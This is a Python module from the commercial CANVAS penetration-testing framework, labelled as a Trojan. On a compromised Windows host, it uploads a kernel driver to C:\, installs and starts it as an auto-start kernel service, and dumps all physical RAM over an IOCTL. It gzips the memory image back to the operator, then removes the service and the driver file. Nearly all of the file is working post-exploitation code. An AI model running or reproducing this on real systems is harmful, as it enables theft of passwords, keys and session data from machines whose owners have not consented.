#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2007
#http://www.immunityinc.com/CANVAS/ for more information

# imports
import sys, os, time, gzip
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from ExploitTypes.localcommand import LocalCommand
from canvaserror import *

# info
NAME             = "ram_dumper"
VERSION          = "1.0"
DESCRIPTION      = "Dumps all physical RAM available on target machine. Uses a kernel driver to bypass usermode restrictions in some versions of Windows."
DOCUMENTATION    = {}

# properties
PROPERTY         ={}
PROPERTY['TYPE'] = "Trojans"
PROPERTY['ARCH'] = [ ["Windows"] ]

NOTES            = """
"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result             = ""
        self.name               = NAME
        self.driver_file        = "rootkits/windows/memdump.sys"
        self.kernelmode_service = "memdump"
        self.ram_size           = 0
        self.bin_file           = "ram.img"
    
    def getArgs(self):
        """ get arguments """
        return

    def read_ram_contents( self, node ):
            
        # Now we send in the RAM amount to be parsed
        GENERIC_READ = 0x80000000
        GENERIC_WRITE= 0x40000000
        OPEN_EXISTING= 0x00000003
                
        file_handle = node.shell.CreateFile("\\\\.\\memdump",GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0)
        self.log("Driver file handle: %08x" % file_handle)
       
        # Start the IOCTL -> send/receive loop
        #bin_file = "%s-%s" % (  self.bin_file,node.getallips()[0] )
        bin_file = "%s-%s" % (  os.path.join(self.bin_path, self.bin_file),node.getallips()[0] )
        
        ###Check if file already exists
        #c=1
        #while 1:
            #try:
                #os.stat("%s.gz"%(bin_file))
                ###File exists append digit to name
                #if c ==1:
                    #bin_file="%s%d"%(bin_file,c)
                #else:
                    #bin_file="%s%d"%(bin_file[:-1],c)
                #c+=1
            #except OSError:
                ###No file already there keep name as is
                #self.log( "Using filename '%s.gz' for ram dump"%(bin_file))
                #break
        
        ##Create a zipfile ready to pipe strings into to be zipped on 'da fly'
        z_file=gzip.GzipFile("%s.gz"%(bin_file),"wb")
        
        node.shell.MemdumpIoctl( file_handle, 0x1337, self.ram_size, z_file)
        z_file.close()
        
        self.log("Finished dumping approximately %d bytes of RAM" % self.ram_size )
        node.shell.CloseHandle( file_handle )
        
        self.log("Compressed size: %d (bytes)" % os.path.getsize("%s.gz" % bin_file) )
        
        
    def load_ram_dumper(self, node ):
        """ Load RAM dumping driver. """
        self.setInfo("%s (in progress)"%(NAME))
        self.log("Attempting to load RAM dumper on Win32 system")

        # XXX: this was for multiple nodes results                
        results = []
        full_path          = "C:\\memdump.sys"
               
        try:
            r = node.upload(self.driver_file, destfilename = full_path)
            results.append((True, str(r)))
            
                            
        except NodeCommandError, i:
            e = "Failed to upload on node %s: %s" % (node.getname(), i)
            self.log(e)
            self.setInfo("%s - Done (failed on upload)" % NAME)
            
            results.append((False, e))  
                    
        # Now that we made it this far, we will attempt
        # to use the service manager to install and get
        # the rootkit pair runnning
        from win32MosdefShellServer import SC_MANAGER_ALL_ACCESS
        from win32MosdefShellServer import SERVICE_AUTO_START
        from win32MosdefShellServer import SERVICE_WIN32_OWN_PROCESS
        from win32MosdefShellServer import SERVICE_ERROR_IGNORE
        from win32MosdefShellServer import SERVICE_ALL_ACCESS
        SERVICE_KERNEL_DRIVER = 0x00000001
        
        service_handle = None
        service_handle = node.shell.OpenSCManager(access=SC_MANAGER_ALL_ACCESS)
        kmode          = None
        
        if service_handle is not None:

            # http://msdn2.microsoft.com/en-us/library/ms681381(VS.85).aspx
            # if dict key blows up .. add that error from the above list  
            errors = { 0x6   : 'ERROR_INVALID_HANDLE',\
                       0x431 : 'ERROR_SERVICE_EXISTS',\
                       0x436 : 'ERROR_DUPLICATE_SERVICE_NAME',\
                       997   : 'ERROR_IO_PENDING', \
                       1060: 'ERROR_SERVICE_DOES_NOT_EXIST', \
                       1072: 'ERROR_SERVICE_MARKED_FOR_DELETION'}

            hkmode, ret = node.shell.CreateService(service_handle, "memdump", "memdump", SERVICE_ALL_ACCESS,\
                                                   SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, full_path)
            if not hkmode:
                self.log("CreateService Failed: %X / %X -> %s" % (hkmode, ret, errors[ret]))
                return 0

            if ret != -1:
                kmode_ret = None
                error = None
                
                kmode_ret, error = node.shell.StartService(hkmode)
                
                if kmode_ret:
                    self.log("Successfully loaded the RAM dumper.\n")
                    self.setInfo("%s (Kernel-Mode) - Done (Success!)" % NAME)
                    node.shell.CloseServiceHandle( hkmode )
                    ret = 1
                else:
                    if error in errors:
                        self.log("Failed to start kernel-mode service. (%X / %X -> %s)" % (kmode_ret, error, errors[error]))
                        ret = 0
                    else:
                        self.log("Failed to start kernel-mode service (Unknown Error 0x%08x)." % error)
                        ret = 0
                        
                    self.setInfo("%s (Kernel-Mode) - Done (Failed)" % NAME)
            else:
                self.log("Failed to install kernel-mode service.")
                self.setInfo("%s (Kernel-Mode) - Done (Failed)" % NAME)
                ret = 0
                
            node.shell.CloseServiceHandle( service_handle )        
        else:
            self.log("Failed to obtain a service handle.")
            self.setInfo("%s (Kernel-Mode) - Done (Failed)" % NAME)
            ret = 0
            
 
        return ret
    
    

    def remove_ram_dumper(self, node):
        """ Unload the RAM dumper """
        
        self.setInfo("%s (in progress)"%(NAME))
        self.log("Attempting to unload RAM dumper.")

        # XXX: this was for multiple nodes results                

        results = []
        
        from win32MosdefShellServer import SC_MANAGER_CREATE_SERVICE
        from win32MosdefShellServer import SERVICE_WIN32_OWN_PROCESS
        from win32MosdefShellServer import SERVICE_AUTO_START
        from win32MosdefShellServer import SERVICE_ERROR_IGNORE
        from win32MosdefShellServer import GENERIC_ALL
        from win32MosdefShellServer import SERVICE_ALL_ACCESS
        from win32MosdefShellServer import SC_MANAGER_ALL_ACCESS
        
        # Open the SC Manager, get a service handle
        # and send the control code to stop the service

        scm_handle    = node.shell.OpenSCManager()
        
        if scm_handle == 0:
            self.log("Couldn't open the Service Manager")
            return -1
        else:
            hservice,error      = node.shell.OpenService(scm_handle,self.kernelmode_service,SERVICE_ALL_ACCESS)
            ret=-1
            if hservice == 0:
                self.log("Error opening the service: %x" % error)
                if error == 0x424:
                    self.log("That service does not exist")
                elif error == 0x430:
                    self.log("The service has been marked for deletion.")
            else:
                           
                ret, current_state = node.shell.ControlService(hservice,0x01)

                import time        
                self.log("Giving the service time to shutdown.")
                time.sleep(5)
                    
                    
                # The service is stopped let's delete it and close the handles
                ret, error = node.shell.DeleteService(hservice)
                if ret == 0:
                    self.log("Failed to delete the service: %x" % error)
                
                node.shell.CloseServiceHandle(hservice)
            
            node.shell.CloseServiceHandle(scm_handle)
                       
   
            if ret != -1:
                    self.log("Successfully unloaded the RAM dumper service.")
                    
                    for file in [ "C:\\memdump.sys" ]:
                        
                        ret = node.shell.unlink( file )
                        
                        if ret:
                            self.log("Successfully deleted %s from the remote filesystem." % file )
                        else:
                            self.log("Failed to delete %s" % file )
         
                    self.setInfo("%s - done (success)" % NAME)
         
                    
            else:
                    self.log("Failed to unload the RAM dumper.")
                    self.setInfo("%s - done (failed: %d" % (NAME,ret))
                              
         
        return ret



    def check_prerequisites(self, node):

        """ Check how much RAM to be dumped. """

        # cross platform support in the future
        ret = 0

        if "win32api" in node.capabilities and "upload" in node.capabilities:
        
            if node.shell:

                # First determine the size of available RAM
                # we will pass this value down to the driver 
                self.ram_size = node.shell.GlobalMemoryStatus()
                self.ram_size = self.ram_size["ullTotalPhysLow"]               

                self.log("Amount of RAM: %d (bytes)" % self.ram_size)

                # Load the RAM dumper and send it the necessary IOCTL
                # to determine how much RAM to parse
                ret = self.load_ram_dumper( node )

                # We got the driver rockin, start pumpin that RAM!
                if ret:
                    self.read_ram_contents(node)

                    # Now it should be finished, remove our collector
                    self.remove_ram_dumper(node)
                return ret

            else:
                ret = 0
        else:
            self.log("Platform not supported yet.")
            ret = 0

        return ret
                

    def run(self):
        """ main """

        self.setInfo("%s (in progress)"%(NAME))

        self.getArgs()
        results = []

        for node in self.argsDict["passednodes"]:

            self.bin_path = self.output(ip=node.get_interesting_interface(), subdir="MemoryDumps")

            ret = self.check_prerequisites(node)

            if ret:
                self.result = "Memory dump successfully completed!"
                self.log(self.result)
                self.setInfo("%s - done (success!)"% NAME)
                return 1
            else:
                self.result = "Memory dump NOT successfully completed"
                self.log(self.result)
                self.setInfo("%s - done (failed)" % NAME )
                return -1


if __name__=="__main__":
    print "[*] This module is designed to be run from inside of CANVAS."
    
